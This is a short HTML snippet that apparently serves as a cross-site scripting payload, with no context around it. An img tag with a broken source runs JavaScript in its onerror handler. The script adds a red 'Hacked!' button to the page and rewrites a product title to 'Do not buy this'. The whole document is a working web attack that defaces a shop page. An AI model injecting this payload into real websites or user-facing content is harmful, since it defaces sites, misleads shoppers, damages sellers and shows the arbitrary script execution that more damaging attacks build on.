<img src=x onerror="const newButton = document.createElement('button');
newButton.textContent = 'Hacked!'; 
newButton.style.position = 'fixed';
newButton.style.top = '10px';
newButton.style.right = '10px';
newButton.style.padding = '10px';
newButton.style.backgroundColor = 'red';
newButton.style.color = 'white';
newButton.style.border = 'none';
newButton.style.cursor = 'pointer';

newButton.addEventListener('click', () => {
    console.log('You have been hacked 🏴‍☠️');
});

document.body.appendChild(newButton);

const prodTitle = document.querySelector('.prod-title');
if (prodTitle) {
    prodTitle.textContent = 'Do not buy this';
}">
